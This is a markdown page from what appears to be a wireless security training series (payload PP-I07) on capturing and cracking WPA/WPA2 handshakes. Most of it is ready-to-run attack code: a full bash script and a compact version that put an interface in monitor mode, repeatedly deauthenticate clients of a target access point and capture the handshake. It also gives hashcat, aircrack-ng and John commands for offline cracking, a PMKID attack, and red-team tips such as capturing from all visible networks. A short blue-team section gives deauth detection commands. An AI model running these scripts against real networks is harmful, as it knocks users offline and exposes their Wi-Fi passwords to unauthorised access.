# PP-I07: WPA Handshake

## Overview

| Property | Value |
|----------|-------|
| **ID** | PP-I07 |
| **Name** | WPA Handshake |
| **Difficulty** | Intermediate |
| **Type** | Attack |
| **Purpose** | Capture WPA/WPA2 handshakes |
| **MITRE ATT&CK** | T1040 (Network Sniffing) |

## What This Payload Does

Captures the WPA 4-way handshake, which contains the hashed password. This can be cracked offline with dictionary attacks or brute force.

---

## Understanding WPA Handshakes

```
┌─────────────────────────────────────────────────────────────┐
│              WPA 4-WAY HANDSHAKE                            │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   CLIENT (Supplicant)              AP (Authenticator)       │
│         │                                │                   │
│         │◄────── Message 1 ──────────────│                  │
│         │        ANonce (AP random)      │                  │
│         │                                │                   │
│         │                                │                   │
│         │────── Message 2 ──────────────►│                  │
│         │  SNonce + MIC (Client random)  │                  │
│         │                                │                   │
│         │                                │                   │
│         │◄────── Message 3 ──────────────│                  │
│         │   GTK + MIC (Group key)        │                  │
│         │                                │                   │
│         │                                │                   │
│         │────── Message 4 ──────────────►│                  │
│         │        ACK                     │                  │
│                                                              │
│   WHAT WE NEED:                                             │
│   • Message 1 OR 2: ANonce                                  │
│   • Message 2: SNonce + MIC (required)                      │
│   • Message 3 OR 4: For verification                        │
│                                                              │
│   Minimum: Messages 2 and 3, or Messages 1 and 2            │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```bash
#!/bin/bash
#
# Payload: PP-I07
# Name: WPA Handshake
# Description: Capture WPA/WPA2 handshakes
# Author: Security Training
#

# ============================================
# CONFIGURATION
# ============================================
INTERFACE="wlan1"
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_ESSID=""
DEAUTH_COUNT=5
OUTPUT_DIR="/sd/loot/handshakes"

# ============================================
# SETUP
# ============================================
LOG_FILE="/tmp/pp-i07.log"
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
CAPTURE_PREFIX="$OUTPUT_DIR/hs_$TIMESTAMP"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "Cleaning up..."
    pkill -f airodump-ng 2>/dev/null
    pkill -f aireplay-ng 2>/dev/null
    airmon-ng stop "${INTERFACE}mon" 2>/dev/null
    exit 0
}

trap cleanup SIGINT SIGTERM

usage() {
    echo "Usage: $0 -b BSSID -c CHANNEL [-e ESSID] [-d DEAUTH_COUNT]"
    echo ""
    echo "Options:"
    echo "  -b    Target BSSID (required)"
    echo "  -c    Target channel (required)"
    echo "  -e    Target ESSID (optional)"
    echo "  -d    Deauth count (default: 5, 0=none)"
    exit 1
}

# ============================================
# PARSE ARGUMENTS
# ============================================
while getopts "b:c:e:d:h" opt; do
    case $opt in
        b) TARGET_BSSID="$OPTARG" ;;
        c) TARGET_CHANNEL="$OPTARG" ;;
        e) TARGET_ESSID="$OPTARG" ;;
        d) DEAUTH_COUNT="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
    echo "ERROR: BSSID and channel required"
    usage
fi

# ============================================
# INITIALIZATION
# ============================================
log "Starting PP-I07: WPA Handshake Capture"
log "Target: $TARGET_BSSID on channel $TARGET_CHANNEL"

mkdir -p "$OUTPUT_DIR"

# ============================================
# ENABLE MONITOR MODE
# ============================================
log "Enabling monitor mode..."
airmon-ng check kill 2>/dev/null
airmon-ng start "$INTERFACE" 2>/dev/null

if ip link show "${INTERFACE}mon" >/dev/null 2>&1; then
    MON_INTERFACE="${INTERFACE}mon"
else
    MON_INTERFACE="${INTERFACE}"
fi

log "Monitor interface: $MON_INTERFACE"

# ============================================
# START CAPTURE
# ============================================
log "Starting packet capture..."

airodump-ng \
    --bssid "$TARGET_BSSID" \
    --channel "$TARGET_CHANNEL" \
    --write "$CAPTURE_PREFIX" \
    --output-format pcap \
    "$MON_INTERFACE" &

AIRODUMP_PID=$!
sleep 5

echo ""
echo "╔════════════════════════════════════════════════════╗"
echo "║         WPA HANDSHAKE CAPTURE                      ║"
echo "╠════════════════════════════════════════════════════╣"
echo "║  Target: $TARGET_BSSID"
echo "║  Channel: $TARGET_CHANNEL"
echo "║  Output: $CAPTURE_PREFIX"
echo "╚════════════════════════════════════════════════════╝"
echo ""

# ============================================
# DEAUTH TO FORCE RECONNECT
# ============================================
if [ "$DEAUTH_COUNT" -gt 0 ]; then
    log "Sending $DEAUTH_COUNT deauth packets..."

    # First, find connected clients
    sleep 3
    CLIENTS=$(grep "$TARGET_BSSID" "${CAPTURE_PREFIX}-01.csv" 2>/dev/null | tail -n +2 | cut -d',' -f1)

    if [ -n "$CLIENTS" ]; then
        for client in $CLIENTS; do
            client=$(echo "$client" | tr -d ' ')
            if [[ "$client" =~ ^[0-9A-Fa-f:]+$ ]]; then
                log "Deauthing client: $client"
                aireplay-ng --deauth "$DEAUTH_COUNT" \
                    -a "$TARGET_BSSID" \
                    -c "$client" \
                    "$MON_INTERFACE" &
            fi
        done
    else
        # Broadcast deauth if no clients found
        log "No specific clients found, sending broadcast deauth"
        aireplay-ng --deauth "$DEAUTH_COUNT" \
            -a "$TARGET_BSSID" \
            "$MON_INTERFACE" &
    fi
fi

# ============================================
# MONITOR FOR HANDSHAKE
# ============================================
log "Waiting for handshake..."

HANDSHAKE_FOUND=false
CHECK_INTERVAL=5
MAX_WAIT=300  # 5 minutes
ELAPSED=0

while [ "$ELAPSED" -lt "$MAX_WAIT" ]; do
    sleep $CHECK_INTERVAL
    ELAPSED=$((ELAPSED + CHECK_INTERVAL))

    CAP_FILE="${CAPTURE_PREFIX}-01.cap"

    if [ -f "$CAP_FILE" ]; then
        # Check for handshake
        RESULT=$(aircrack-ng "$CAP_FILE" 2>/dev/null)

        if echo "$RESULT" | grep -q "1 handshake"; then
            HANDSHAKE_FOUND=true
            echo ""
            echo "╔════════════════════════════════════════════════════╗"
            echo "║          HANDSHAKE CAPTURED!                       ║"
            echo "╚════════════════════════════════════════════════════╝"
            echo ""
            log "Handshake captured: $CAP_FILE"

            # Save metadata
            echo "BSSID: $TARGET_BSSID" > "${CAPTURE_PREFIX}_info.txt"
            echo "ESSID: $TARGET_ESSID" >> "${CAPTURE_PREFIX}_info.txt"
            echo "Channel: $TARGET_CHANNEL" >> "${CAPTURE_PREFIX}_info.txt"
            echo "Captured: $(date)" >> "${CAPTURE_PREFIX}_info.txt"
            echo "File: $CAP_FILE" >> "${CAPTURE_PREFIX}_info.txt"

            break
        fi
    fi

    echo -ne "\rWaiting for handshake... ${ELAPSED}s / ${MAX_WAIT}s"

    # Send additional deauths periodically
    if [ $((ELAPSED % 30)) -eq 0 ] && [ "$DEAUTH_COUNT" -gt 0 ]; then
        aireplay-ng --deauth "$DEAUTH_COUNT" -a "$TARGET_BSSID" "$MON_INTERFACE" &>/dev/null &
    fi
done

if [ "$HANDSHAKE_FOUND" = false ]; then
    echo ""
    log "No handshake captured within timeout"
    log "Try again or wait for client to connect"
fi

echo ""
log "Capture file: $CAP_FILE"
echo ""
echo "Next steps:"
echo "  1. Convert to hashcat: aircrack-ng -J ${CAPTURE_PREFIX} $CAP_FILE"
echo "  2. Crack with aircrack: aircrack-ng -w wordlist.txt $CAP_FILE"
echo "  3. Crack with hashcat: hashcat -m 22000 ${CAPTURE_PREFIX}.22000 wordlist.txt"
echo ""

cleanup
```

---

## Handshake Validation

### Check if Handshake is Valid
```bash
# Method 1: aircrack-ng
aircrack-ng capture-01.cap
# Look for "1 handshake" next to target BSSID

# Method 2: Wireshark filter
# Display filter: eapol

# Method 3: pyrit
pyrit -r capture-01.cap analyze
```

### Incomplete Handshakes
```
Messages captured | Crackable?
=====================================
M1 only          | No
M2 only          | No
M1 + M2          | Yes
M2 + M3          | Yes
M1 + M2 + M3     | Yes (best)
M1 + M2 + M3 + M4| Yes (complete)
```

---

## Cracking the Handshake

### With Aircrack-ng
```bash
# Dictionary attack
aircrack-ng -w /path/to/wordlist.txt -b $BSSID capture-01.cap

# Multiple wordlists
aircrack-ng -w list1.txt,list2.txt,list3.txt capture-01.cap
```

### With Hashcat (Faster)
```bash
# Convert to hashcat format
# Old method (hccapx)
aircrack-ng -J output capture-01.cap

# New method (22000)
hcxpcapngtool -o output.22000 capture-01.cap

# Crack
hashcat -m 22000 output.22000 wordlist.txt

# With rules
hashcat -m 22000 output.22000 wordlist.txt -r best64.rule

# Brute force 8 digits
hashcat -m 22000 output.22000 -a 3 ?d?d?d?d?d?d?d?d
```

### With John the Ripper
```bash
# Convert
aircrack-ng -J output capture-01.cap
hccap2john output.hccap > hash.txt

# Crack
john --wordlist=wordlist.txt hash.txt
```

---

## PMKID Attack (Clientless)

No client needed - request PMKID directly from AP:

```bash
# Capture PMKID
hcxdumptool -i wlan1mon -o output.pcapng --filterlist_ap=target.txt --filtermode=2

# Convert
hcxpcapngtool -o output.22000 output.pcapng

# Crack
hashcat -m 22000 output.22000 wordlist.txt
```

---

## Red Team Perspective

### Maximizing Captures
1. **Multiple targets** - Capture from all visible networks
2. **Patient waiting** - Passive capture is stealthier
3. **Strategic deauth** - During high-traffic times
4. **PMKID first** - Try clientless before deauth

### Post-Capture
- Upload to cloud cracking
- Use GPU cluster
- Try common passwords first
- Use targeted wordlists (company names, locations)

---

## Blue Team Perspective

### Detection
```bash
# Detect excessive deauth frames
tshark -i wlan0 -Y "wlan.fc.type_subtype == 0x0c" | wc -l
# High count = likely attack

# Alert on deauth to critical APs
tshark -i wlan0 -Y "wlan.fc.type_subtype == 0x0c && wlan.bssid == $CRITICAL_AP"
```

### Countermeasures
1. **Strong passwords** - 15+ chars, random
2. **WPA3** - Resistant to offline cracking (SAE)
3. **Deauth detection** - WIDS alerting
4. **PMF** - Protected Management Frames

---

## Payload File

Save as `PP-I07_WPA_Handshake.sh`:

```bash
#!/bin/bash
# PP-I07: WPA Handshake (Compact)
BSSID="${1:?Usage: $0 BSSID CHANNEL}"
CH="${2:?Usage: $0 BSSID CHANNEL}"
airmon-ng start wlan1
airodump-ng -c $CH --bssid $BSSID -w /tmp/hs wlan1mon &
sleep 10
aireplay-ng --deauth 5 -a $BSSID wlan1mon
sleep 20
pkill airodump
aircrack-ng /tmp/hs-01.cap | grep "handshake"
echo "Capture: /tmp/hs-01.cap"
```

---

[← PP-I06 WEP Crack](PP-I06_WEP_Crack.md) | [Back to Intermediate](README.md) | [Next: PP-I08 Client Deauth →](PP-I08_Client_Deauth.md)
